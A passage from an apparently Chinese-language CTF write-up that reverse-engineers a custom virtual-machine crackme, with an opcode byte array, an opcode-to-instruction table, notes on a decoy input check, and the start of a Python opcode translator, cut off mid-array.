class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF4</span>]<br></code></pre></td></tr></table></figure><p>提出<code>opcode</code>之后分析下方的函数，可以很容易进行识别，其中<code>mov</code>中还有一部分指令，作用是将输入的不同数据移动到对应的虚拟寄存器中，可以参考上文的<a href="##%E5%85%B7%E4%BD%93%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0">具体执行函数实现</a></p><p><img src="https://s2.loli.net/2022/07/04/7SKOAH2Qdw9FUre.png" alt="3.png"></p><p>分析出来每个函数对应的作用我们就可以开始进行逆向了</p><p><img src="https://s2.loli.net/2022/07/04/5KlTGE9YIWJU2eg.png" alt="4.png"></p><p><img src="https://s2.loli.net/2022/07/04/ej1BqlE8uv2VYay.png" alt="5.png"></p><p><img src="https://s2.loli.net/2022/07/04/LDzw7B5OKpR8gnl.png" alt="6.png"></p><p>需要注意的是在这个程序中对应的<code>opcode</code>中存在有两个输入，因此程序中可能会有两个判断过程，当我们输入完后后续还有一个过程。但是我们输入第一个发生错误后程序就直接结束了，因此我们判断第一个输入的<code>check</code>是假的，需要我们找到对应的函数，但是直接找函数却是无法找到，因此我们切换到汇编</p><p><img src="https://s2.loli.net/2022/07/04/47Y5FyZOvJWKsaC.png" alt="7.png"></p><p>切换到汇编后我们可以明显看到第一个判断的数据上方还有一个数据段长度和假的加密后的数据长度相同，因此我们合理猜测这个数据是我们真正加密后的数据，通过交叉引用可以发现真正的加密部分</p><p><img src="https://s2.loli.net/2022/07/04/V7pWNLfA4QsvxBj.png" alt="9.png"></p><p>真正加密部分：</p><p><img src="https://s2.loli.net/2022/07/04/xIrjG4v2pWAm1wQ.png" alt="8.png"></p><p>对此我们的程序的大致分析就结束了，可以总结出来如下的一个函数段表，为我们后续的翻译<code>opcode</code>做准备：</p><table><thead><tr><th style="text-align:center">机器码</th><th style="text-align:center">备注</th></tr></thead><tbody><tr><td style="text-align:center">0xF1</td><td style="text-align:center">mov</td></tr><tr><td style="text-align:center">0xF2</td><td style="text-align:center">xor</td></tr><tr><td style="text-align:center">0xF4</td><td style="text-align:center">nop</td></tr><tr><td style="text-align:center">0xF5</td><td style="text-align:center">scanf</td></tr><tr><td style="text-align:center">0xF7</td><td style="text-align:center">mul</td></tr><tr><td style="text-align:center">0xF8</td><td style="text-align:center">swap</td></tr><tr><td style="text-align:center">0xF6</td><td style="text-align:center">线性运算</td></tr><tr><td style="text-align:center">0xE1</td><td style="text-align:center">从内存单元input将数据移动到寄存器r1</td></tr><tr><td style="text-align:center">0xE2</td><td style="text-align:center">从内存单元input将数据移动到寄存器r2</td></tr><tr><td style="text-align:center">0xE3</td><td style="text-align:center">从内存单元input将数据移动到寄存器r3</td></tr><tr><td style="text-align:center">0xE4</td><td style="text-align:center">从寄存器r1将数据移动到内存单元input</td></tr><tr><td style="text-align:center">0xE5</td><td style="text-align:center">从内存单元input将数据移动到寄存器r4</td></tr><tr><td style="text-align:center">0xE7</td><td style="text-align:center">从寄存器r2将数据移动到内存单元input</td></tr></tbody></table><p>至此我们就可以开始编写这个<code>VM</code>的翻译机器了将其转化为高级语言的语法格式，方便我们后续的逆向过程，翻译脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode = [<span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span 